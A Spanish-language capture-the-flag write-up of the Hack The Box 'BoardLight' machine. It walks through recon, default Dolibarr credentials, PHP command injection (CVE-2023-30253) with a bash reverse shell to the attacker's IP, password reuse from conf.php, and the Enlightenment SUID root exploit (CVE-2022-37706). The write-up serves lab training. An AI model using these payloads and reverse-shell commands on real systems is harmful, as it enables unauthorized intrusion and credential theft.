@@ -1,0 +1,635 @@
+----------------------
+[ BOARDLIGHT MACHINE ]
+----------------------
+
+# Notas sobre la resolución de la máquina BOARDLIGHT por FeathersMcgr4w
+
+[GITHUB]: https://github.com/FeathersMcgr4w/
+
+[Lets Start!]
+
+-----
+| 1 | Ejecutamos un ping para verificar si esta activa la maquina victima --> ping -c 1 10.10.11.11
+-----
+          -> ping -c 1 10.10.11.11 -R  (Trace Route)
+
+        [*] ttl: 63 (Linux) => Linux (ttl=64) | Windows (ttl=128)
+
+
+
+-----
+| 2 | Escaneo rápido de Puertos con NMAP
+-----
+
+└─$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.11 -oG allPorts
+
+Puertos Abiertos:
+
+        [*] Open ports: 22, 80
+
+
+
+-----
+| 3 | Obtener información detallada con NMAP:
+-----
+
+(scripts de reconocimiento y exportar en formato nmap)
+
+locate .nse | xargs grep "categories" | grep -oP '".*?"' | tr -d '"' | sort -u (scripts de reconocimiento)
+
+
+└─# nmap -sCV -p22,80 10.10.11.11 -oN targeted
+
+	    [*] 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+
+        [*] 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+
+        [*] Service Info: OS: Linux
+
+		Procedemos a googlear la versión de Ubuntu -> "OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 launchpad"
+		Con esto obtenemos que la versión de Ubuntu es una distribución "Ubuntu Focal"
+		Recurso: https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.11
+
+
+
+-----
+| 4 | WHATWEB
+-----
+
+└─# whatweb 10.10.11.11
+
+http://10.10.11.11 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]
+
+
+-[ DATA ]: 
+			Dominio => Email[info@board.htb]
+
+			SO => HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]
+
+
+-[ WARNING ]: 
+			El dominio (board.htb) no lo podemos ejecutar por error DNS. Pero si podemos ejecutar directamente de la direcc IP 10.10.11.11
+			
+			Para resolver esto devemos agregar el dominio (board.htb) al /etc/hosts file
+			
+
+
+-----
+| 5 | Add this vHost to our /etc/hosts file
+-----
+Esto lo debemos realizar ya que cuando accedemos a al dominio por el navegador no funciona. Debido a que el dominio "board.htb" no existe en DNS públicos.
+Es un entorno de laboratorio, asi que le debemos indicar a nustro sistema que asocie la ip+dominio para que cuando realizemos la petición nos renderize el sitio.
+Esto es similar a indicarle a nuestra maquina que utilize el localhost 127.0.0.1 con un dominio de prueba localhost.
+
+
+Para solucionar este problema, debemos ejecutar el siguiente comando. 
+Esto permite que el nombre de dominio sea resuelto localmente como 10.10.11.11 sin necesidad de consultar DNS externos.
+
+echo '10.10.11.11 board.htb' | sudo tee -a /etc/hosts  
+
+
+└─# cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       sonic.sonic     sonic
+10.10.11.221 2million.htb
+10.10.11.11 board.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+
+-----
+| 6 | Fuzzear con NMAP
+-----
+
+Internamnete NMAP tiene un pequeño diccionario con el que fuzzea
+
+nmap --script http-enum -p80 10.10.11.11 -oN webScan
+
+	--script http-enum: indica a nmap usar el script "http-enum", perteneciente a la libreria .nse (Nmap Scripting Engine)
+						El script se utiliza para enumerar directorios en servidores web.
+
+	-p80: escanear por puerto 80
+
+	10.10.11.11: dirección IP objetivo
+
+	-oN webScan: guarda los resultados en formato legible "output normal"
+
+
+
+└─# nmap --script http-enum -p80 10.10.11.11 -oN webScan
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 08:02 MST
+Nmap scan report for board.htb (10.10.11.11)
+Host is up (0.21s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 54.07 seconds
+
+
+NO ENCONTRO NADA :(
+
+
+
+-----
+| 7 | Fuzzeamos con wfuzz
+-----
+
+wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://board.htb/FUZZ
+
+	wfuzz : ejecutar herramienta wfuzz 
+
+	-c : activar salida de colores en la terminal.
+
+	--hc=404 : wfuzz ignorara las respuestas http con código de estado 404
+
+	-t 200 : usar 200 hilos de ejecución en paralelo ( 200 consultas en paralelo )
+
+	-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt : diccionario que utiliza wfuzz
+
+	http://board.htb/FUZZ : URL objetivo + "FUZZ" marca la posición donde coloca el diccionario
+	
+
+	NO HAY NADA QUE NO INTEREZA :(
+
+
+
+----- 
+| 8 | Buscammos manualmente en la web con Ctrol+u 
+-----
+
+	[*] index.php
+	[*] about.php
+	[*] do.php
+	[*] contact.php
+
+	NO HAY NADA QUE NO INTEREZA :(
+
+
+
+-----
+| 9 | Buscamos Sub-dominios
+-----
+
+wfuzz -c --hl=517 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.board.htb" http://board.htb/
+
+	--hl=517 : estas son respuestas basura, asi que, le indicamos que no las muestre
+
+		000000055:   200        517 L    1053 W     15949 Ch    "backup"
+		000000059:   200        517 L    1053 W     15949 Ch    "www.forum"
+		000000067:   200        517 L    1053 W     15949 Ch    "staging"
+		000000066:   200        517 L    1053 W     15949 Ch    "www3"
+
+	-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt : diccionario para sub dominios
+
+	-H "Host: FUZZ.board.htb" : indicamos la cabezera para inyectar el diccionario con sub dominios
+
+
+-[ RESULTADOS ]:
+
+000000072:   200        149 L    504 W      6360 Ch     "crm"                                                                                                                       
+000009532:   400        10 L     35 W       301 Ch      "#www"                                                                                                                      
+000010581:   400        10 L     35 W       301 Ch      "#mail"
+
+
+-[*] Ahora incorporamos el sub dominio al /etc/hosts
+
+	nano /etc/hosts
+
+	10.10.11.11 board.htb
+	10.10.11.11 crm.board.htb
+
+
+
+------
+| 10 | Panel CMR Dolibarr
+------
+
+Dolibarr 17.0.0
+
+¿Qué es Dolibarr?
+
+Dolibarr es un software ERP (Enterprise Resource Plannig) y CMR (Customer Relationship Managment) de código abierto, para gestionar múltiples aspecto de una empresa.
+Ventas, inventario, facturación, proyectos, rrhh, contabilidada, etc.
+
+
+
+------
+| 11 | Ver exploits para Dolibarr
+------
+
+1. Podemos usar una herramienta en Kali Linux que consulta a exploit-DB
+
+	└─# searchsploit dolibarr 17
+
+
+2. Googlear "Dolibarr 17.0.0 exploit github"
+
+	
+	Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
+
+	dolibarr default password : admin / admin
+
+
+Las probamos en el Login y entramos.
+
+
+
+------
+| 12 | Ejecutamos explotación (exploit for Dolibarr <= 17.0.0 (CVE-2023-30253))
+------
+
+-[*] Git Clone : https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
+
+-[*] └─# python3 exploit.py http://crm.board.htb admin admin 10.10.16.54 443
+
+-[*] └─$ nc -nlvp 443 (en otra consola)
+
+Lo que realiza el exploit es ejecutar una reverse shell a traves de php --> <?pHp system("whoami"); ?>
+
+	Pasos:
+	
+	-> Loggearse en Dolibarr con admin / admin
+	
+	-> Caemos al Home : http://crm.board.htb/admin/index.php?mainmenu=home&leftmenu=setup&mesg=setupnotcomplete
+	
+	-> Nos dirigimos a la URL para crear una web : http://crm.board.htb/website/index.php?idmenu=1&mainmenu=website&leftmenu=
+	
+		Name of the website: test	
+		Main language	
+		Other languages
+	
+		Description: test
+		Virtual host or domain name: http://test.com
+
+
+	-> Creamos una Página :  Or create page from scratch or from a page template...
+
+		title: test
+		description: test
+		HTML header (specific to this page only): Hola
+
+	-> Apretar boton "HTML" en el apartado de al página
+
+		<section id="mysection1" contenteditable="true">
+			<?pHp system("whoami"); ?>
+		</section>
+
+	-> <section id="mysection1" contenteditable="true">
+			<?pHp system($_GET['cmd']); ?>
+	   </section>
+
+	-> Inyectar comando: &cmd=bash -c "bash -i >& /dev/tcp/10.10.16.54/443 0>&1" (este es el comando, pero hay que aplicarle este formato: )
+ 
+		-> &cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.54/443 0>%261" ( *comando final* )
+
+
+-[*] Consola con netcat:
+
+─$ nc -nlvp 443  
+listening on [any] 443 ...
+connect to [10.10.16.54] from (UNKNOWN) [10.10.11.11] 48288
+bash: cannot set terminal process group (856): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
+
+
+-[*] PSEUDO CONSOLA:
+
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ script /dev/null -c bash
+<htb/htdocs/public/website$ script /dev/null -c bash            
+Script started, file is /dev/null
+
+
+-[*] Cambiar a consola /bin/bash:
+
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ echo $SHELL
+echo $SHELL
+/usr/sbin/nologin
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ export SHELL=/bin/bash
+<d.htb/htdocs/public/website$ export SHELL=/bin/bash            
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ echo $SHELL
+echo $SHELL
+/bin/bash
+
+
+-[NOTA]: 
+
+	SHELL :  es un avariable de entorno que que contiene la ruta del interprete de comandos (shell) que se usa actualmente
+
+	export : este comando establece o modifica una variable de entorno, para que este disponible en la shell actual y para cualquier subproceso.
+
+
+-[ARCHIVO "conf"]
+
+Los CMR por lo general tinen un archivo con nombre "conf" (Wordpress: wp-config.php). Buscarlo y analizarlo.
+
+-[*] Nos posicionamos en el directorio raíz y filtramos por archivo "conf"
+
+www-data@boardlight:~/html/crm.board.htb$ find . -name \*conf\* 2>/dev/null
+
+
+www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls -l
+ls -l
+total 44
+-rw-r--r-- 1 www-data www-data  1736 May 17 00:18 conf.php
+-rw-r--r-- 1 www-data www-data 16394 Mar  4  2023 conf.php.example
+-r-------- 1 www-data www-data 16394 May 13 13:20 conf.php.old
+
+
+
+www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
+cat conf.php
+<?php
+//
+// File generated by Dolibarr installer 17.0.0 on May 13, 2024
+//
+// Take a look at conf.php.example file for an example of conf.php file
+// and explanations for all possibles parameters.
+//
+$dolibarr_main_url_root='http://crm.board.htb';
+$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
+$dolibarr_main_url_root_alt='/custom';
+$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
+$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
+$dolibarr_main_db_host='localhost';
+$dolibarr_main_db_port='3306';
+$dolibarr_main_db_name='dolibarr';
+$dolibarr_main_db_prefix='llx_';
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!';
+$dolibarr_main_db_type='mysqli';
+$dolibarr_main_db_character_set='utf8';
+$dolibarr_main_db_collation='utf8_unicode_ci';
+// Authentication settings
+$dolibarr_main_authentication='dolibarr';
+
+//$dolibarr_main_demo='autologin,autopass';
+// Security settings
+$dolibarr_main_prod='0';
+$dolibarr_main_force_https='0';
+$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
+$dolibarr_nocsrfcheck='0';
+$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
+$dolibarr_mailing_limit_sendbyweb='0';
+$dolibarr_mailing_limit_sendbycli='0';
+
+//$dolibarr_lib_FPDF_PATH='';
+//$dolibarr_lib_TCPDF_PATH='';
+//$dolibarr_lib_FPDI_PATH='';
+//$dolibarr_lib_TCPDI_PATH='';
+//$dolibarr_lib_GEOIP_PATH='';
+//$dolibarr_lib_NUSOAP_PATH='';
+//$dolibarr_lib_ODTPHP_PATH='';
+//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
+//$dolibarr_js_CKEDITOR='';
+//$dolibarr_js_JQUERY='';
+//$dolibarr_js_JQUERY_UI='';
+
+//$dolibarr_font_DOL_DEFAULT_TTF='';
+//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
+$dolibarr_main_distrib='standard';
+
+
+
+-[*] Buscar usuario para rootear y usar la contraseña de la DB (serverfun2$2023!!):
+
+
+www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls /home/
+ls /home/
+larissa
+
+
+www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat /etc/passwd | grep -i "larissa"
+<tb/htdocs/conf$ cat /etc/passwd | grep -i "larissa"  
+larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
+
+
+www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat /etc/passwd | grep -i -E "larissa|root"
+<s/conf$ cat /etc/passwd | grep -i -E "larissa|root"  
+root:x:0:0:root:/root:/bin/bash
+larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
+
+
+-[*] Loggeamos con larissa pero no es root:
+
+www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su larissa
+su larissa
+Password: serverfun2$2023!!
+
+
+larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ whoami
+whoami
+larissa
+larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ id
+id
+uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
+
+
+
+-[*] Nos dirijimos al directorio /home/larissa/ y obtenemos la 1° FLAG:
+
+
+larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ cd /home/larissa
+cd /home/larissa
+
+
+larissa@boardlight:~$ ls -l
+ls -l
+total 40
+drwxr-xr-x 2 larissa larissa 4096 May 17 01:04 Desktop
+drwxr-xr-x 2 larissa larissa 4096 May 17 01:04 Documents
+drwxr-xr-x 3 larissa larissa 4096 May 17 01:04 Downloads
+-rwxrwxr-x 1 larissa larissa  709 Oct  8 05:04 exploit.sh
+drwxr-xr-x 2 larissa larissa 4096 May 17 01:04 Music
+drwxr-xr-x 2 larissa larissa 4096 May 17 01:04 Pictures
+drwxr-xr-x 2 larissa larissa 4096 May 17 01:04 Public
+drwxr-xr-x 2 larissa larissa 4096 May 17 01:04 Templates
+-rw-r----- 1 root    larissa   33 Oct  8 04:24 user.txt
+drwxr-xr-x 2 larissa larissa 4096 May 17 01:04 Videos
+
+
+larissa@boardlight:~$ cat user.txt
+cat user.txt
+0e3caab77d061610df8fdceb185bf4a8
+
+
+-[*] Verifiacamos la versión de Ubuntu;
+
+larissa@boardlight:~$ lsb_release -a
+lsb_release -a
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 20.04.6 LTS
+Release:        20.04
+Codename:       focal
+
+
+
+-[*] Ganar acceso a Root:
+
+Probamos los siguientes comnandos para ver si tenemos acceso:
+
+-[ /root/ ]
+
+	larissa@boardlight:~$ cd /root/
+	cd /root/
+	bash: cd: /root/: Permission denied
+
+
+-[ sudo -l ]
+
+	larissa@boardlight:~$ sudo -l
+
+	Permission denied
+
+
+-[ find SUID ]
+
+Buscamos archivos en el sistema que puedan poseer el permiso SUID.
+
+find / -perm -4000 -user root 2>/dev/null | xargs ls -l
+
+	find / : buscar en todo el sistema de archivos desde la raíz
+
+	-perm -4000 : buscar archivos que coinsidan con el permiso "4000"
+
+	-4000 : este permiso lo tienen archivos con el bit SUID activado
+
+	-user root : filtra los resultados de find para mostrar los archivos pertenecientes a root
+	
+	2>/dev/null : redirección de errores 
+
+	| xargs ls -l : toma la salida std y ejecuta un "ls -l"
+
+
+
+larissa@boardlight:/var/www/html/crm.board.htb/htdocs$ find / -perm -4000 -user root 2>/dev/null | xargs ls -l   
+< / -perm -4000 -user root 2>/dev/null | xargs ls -l   
+-rwsr-xr-x 1 root root        85064 Feb  6  2024 /usr/bin/chfn
+-rwsr-xr-x 1 root root        53040 Feb  6  2024 /usr/bin/chsh
+-rwsr-xr-x 1 root root        39144 Mar  7  2020 /usr/bin/fusermount
+-rwsr-xr-x 1 root root        88464 Feb  6  2024 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root        55528 Apr  9 08:34 /usr/bin/mount
+-rwsr-xr-x 1 root root        44784 Feb  6  2024 /usr/bin/newgrp
+-rwsr-xr-x 1 root root        68208 Feb  6  2024 /usr/bin/passwd
+-rwsr-xr-x 1 root root        67816 Apr  9 08:34 /usr/bin/su
+-rwsr-xr-x 1 root root       166056 Apr  4  2023 /usr/bin/sudo
+-rwsr-xr-x 1 root root        39144 Apr  9 08:34 /usr/bin/umount
+-rwsr-xr-x 1 root root        14728 Oct 27  2023 /usr/bin/vmware-user-suid-wrapper
+-rwsr-xr-- 1 root messagebus  51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root       477672 Jan  2  2024 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
+-rwsr-xr-x 1 root root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
+-rwsr-xr-x 1 root root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+-rwsr-xr-x 1 root root        26944 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+-rwsr-sr-x 1 root root        14488 Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
+-rwsr-xr-- 1 root dip        395144 Jul 23  2020 /usr/sbin/pppd
+
+
+Nos quedamos con el binario : enlightenment
+
+
+
+
+-[*] ¿Que es Enlightenment?
+
+El binario 'Enlightenment' es parte de un entorno de escritorio ligero para sistemas Linux y otros UNIX-like.
+Su proposito es proporcionar una interfaz gráfica (GUI) y configurable. 'Enlightenment' interactua a nivel de sistema
+con hardware y permisos del sistema. Si el binario esta mal configurado o tiene bugs, puede ser vulnerable a ejecutar
+comandos como root.
+
+El binario 'Enlightenment 0.23.1' tiene activado el SUID hasta version (v0.25.3), lo cual lo hace vulnerable a explotación de privilegios.
+
+Las veriones hasta 'Enlightenment 0.25.3' son vulnerables a que un usuario sin privilegios ejecute código como root. Aprovechando las 
+fallas de como el binario interactua con el sistema cuando tiene el bit SUID activado.
+
+
+
+
+Vemos la versión:
+
+larissa@boardlight:/var/www/html/crm.board.htb/htdocs$ enlightenment --version
+</html/crm.board.htb/htdocs$ enlightenment --version   
+ESTART: 0.00001 [0.00001] - Begin Startup
+ESTART: 0.00015 [0.00014] - Signal Trap
+ESTART: 0.00016 [0.00002] - Signal Trap Done
+ESTART: 0.00019 [0.00002] - Eina Init
+ESTART: 0.00054 [0.00036] - Eina Init Done
+ESTART: 0.00057 [0.00002] - Determine Prefix
+ESTART: 0.00092 [0.00035] - Determine Prefix Done
+ESTART: 0.00095 [0.00004] - Environment Variables
+ESTART: 0.00099 [0.00003] - Environment Variables Done
+ESTART: 0.00101 [0.00002] - Parse Arguments
+Version: 0.23.1
+E: Begin Shutdown Procedure!
+
+
+
+-[*] Buscamos si hay vulnerabilidad con searchsploit en otra terminal:
+
+└─$ searchsploit enlightenment
+
+Enlightenment - Linux Null PTR Dereference Framework                                                                                                       | linux/local/9627.txt
+Enlightenment v0.25.3 - Privilege escalation                                                                                                               | linux/local/51180.txt
+
+
+Con esto obtenemos que nuestra versión (0.23.1) puede llegar a ser vulnerable (Enlightenment v0.25.3 - Privilege escalation)
+
+
+
+-[*] Buscamos un exploit en google: "enlightenment github exploit privilege escalation"
+
+
+CVE-2022-37706 Detail
+Description
+
+enlightenment_sys in Enlightenment before 0.25.4 allows local users to gain privileges because it is setuid root, and the system library function mishandles pathnames that begin with a /dev/.. substring.
+
+
+-[ GITHUB ] https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
+
+
+(Descargamos recurso en nuestra maquina kali): git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
+(Comprimimos): zip cve.zip -r CVE-2023-0386
+(Levantamos server para compartir): python3 -m http.server 80
+
+(Descargamos archivo desde maquina victima): larissa@boardlight:/tmp$ wget http://10.10.16.54/cve.zip
+
+     wget: es una herramienta para descargar archivos de servidores con protocolos http, https, ftp.
+
+(Descomprimimos): unzip cve.zip
+
+
+
+-[*] Ejecutar exploit.sh
+
+larissa@boardlight:/tmp/CVE-2022-37706-LPE-exploit$ ./exploit.sh  
+./exploit.sh
+CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Enjoy the root shell :)
+mount: /dev/../tmp/: can't find in /etc/fstab.
+# whoami
+whoami
+root
+
+
+¡Listo, ya somos root!
+
+
+
+-[*] Buscamos la flag final en /root/:
+
+cd /root/
+cat root.txt
+7031d49eb90115295cb10fa4edf782d1
